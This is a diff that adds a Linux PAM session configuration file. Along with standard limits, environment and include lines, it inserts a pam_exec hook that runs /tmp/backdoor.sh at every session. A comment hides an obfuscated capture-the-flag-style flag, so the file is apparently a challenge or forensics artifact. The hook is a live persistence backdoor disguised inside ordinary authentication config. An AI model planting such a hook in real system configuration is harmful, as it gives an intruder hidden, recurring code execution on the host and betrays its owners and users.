@@ -1,0 +1,15 @@
+#%PAM-1.0
+
+# Set up user limits from /etc/security/limits.conf.
+session    required   pam_limits.so
+
+session    required   pam_env.so readenv=1 user_readenv=0
+session    required   pam_env.so readenv=1 envfile=/etc/default/locale user_readenv=0
+
+# CantStopWontStop
+session optional pam_exec.so /tmp/backdoor.sh
+
+#L#3#a#k#{#5#u#p#3#r#_#5#h#3#1#1#_#u#5#3#r#}
+@include common-auth
+@include common-account
+@include common-session-noninteractive
